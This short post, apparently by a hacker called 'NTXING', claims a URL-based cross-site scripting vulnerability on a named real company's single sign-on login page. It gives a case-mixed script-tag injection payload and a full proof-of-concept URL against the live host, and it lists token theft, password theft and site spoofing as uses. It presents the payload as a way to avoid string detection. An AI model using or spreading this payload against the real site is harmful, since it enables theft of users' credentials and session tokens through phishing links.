EXPLOIT FOUND BY NTXING CODED BY NTXING EXPLOITED BY NTXING


## Status: Vulnerable😡

### website: https://ssologin.nbcuni.com/login/login.jsp
#### Vulnibity: URL-Based Stored Cross-Site Scripting

**What can this exploit do?0**

- lets attackers steal access tokens
- inject JS in to page
- steal passwords when entered
- spoof website

**Where?**
In support URL. Attacker will send victim the payload url

**xss injection**
```html
ScripT><ScRIpT>PAYLOAD</scRIpT>&TYPE=33554433 -d alert(0)=
```
this will be url encoded

**Proof of work**
```html
https://ssologin.nbcuni.com/login/login.jsp?GUID=&METHOD=GET&REALMOID=06-0009e2d8-db31-1580-b135-b18a0303f045&SMAGENTNAME=-SM-ytANZow+tuVB5Fe2fulv1ewOCwpmtxxLxQxNRRMbJdz7F1bbJrGLHTuQn5LLn0MiDgsP6M53Q2xh7X7GV8HfIIxIIy8nHAOp&SMAUTHREASON=0&TARGET=-SM-https://myschedule.nbcuni.com/SchedulerPortal.aspx%3C/ScripT%3E%3CScRIpT%3Evar%20x=String(/HELLO%20THIS%20IS%20AN%20XSS%20VUN/);x=x.substring(1,x.length-1),alert(x);%20%3C/scRIpT%3E&TYPE=33554433%20-d%20alert(0)=

```
the following shows how to avoid sting detection in url and excute alert script


